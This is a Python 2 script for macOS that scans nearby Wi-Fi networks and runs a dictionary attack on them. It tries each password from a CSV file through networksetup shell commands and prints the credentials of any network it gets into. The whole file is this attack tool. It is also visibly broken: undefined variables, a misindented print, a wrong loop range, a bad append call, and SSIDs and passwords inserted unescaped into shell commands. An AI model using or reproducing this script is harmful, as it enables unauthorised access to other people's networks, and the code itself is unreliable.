import os, sys, csv
from subprocess import call, check_output, CalledProcessError
import xml.etree.ElementTree as ET


PASSWORDS = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'password.csv')

def get_network_list():
	#execute command to get nearby network list in xml:
	net_list_comm = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s -x'
	net_list_xml = check_output(net_list_comm, shell=True)
	root = ET.fromstring(net_list_xml)

	#numbers of netowrks
	_ssids = []
	num_net = len(root[0][0])
	net_array = []
	net_names = []
	for i in range(0,num_net):
		#ssid
		_ssid = root[0][0][i][7].text
		_ssid_name = root[0][0][i][32].text
		_ssids.append(_ssid)
		net_names.append(_ssid_name)

	net_array.append(num_net,_ssids,net_names)
	return net_array

def _sanitize_field(node):
	if node:
		return node.replace("'", "\'")
	else:
		return node
	return node

def process_element(itera,loop,elem,networks):
	net_size = net_array[0]
	net_data = net_array[1]
	net_names_array = net_array[2]

	#might want to run all lower, all upper, first upper, every other lower, every other upper
	_pass = _sanitize_field(elem[0])
	_freq = _sanitize_field(elem[1])

	try:
		for i in (0,net_size):
			#execute command to login to netowrk, find out how long this process is, this will be the benchmark point/bottleneck (can  run concurently?)
			net_con = 'networksetup -setairportnetwork Airport %s %s' % (net_data[i],_pass)
			#or use call to check state
			#call(net_con, shell=True)
			output = check_output(net_con, shell=True)

			if output:
				#if connection is succesful
			print 'Network Name: %s\n Network SSID: %s\n Network Password: %s\n' % (net_names_array[i],net_data[i],_pass)
			sys.exit()
	except CalledProcessError:
		pass

#get network array (size of list, list)
network_data = get_network_list()


with open(PASSWORDS, 'rU') as f:
	#filtered = (l.replace('\n', '') for l in f)
	reader = csv.reader(f)
	for i, line in enumerate(reader):
		#print line
		process_element(i,x,line,net_array)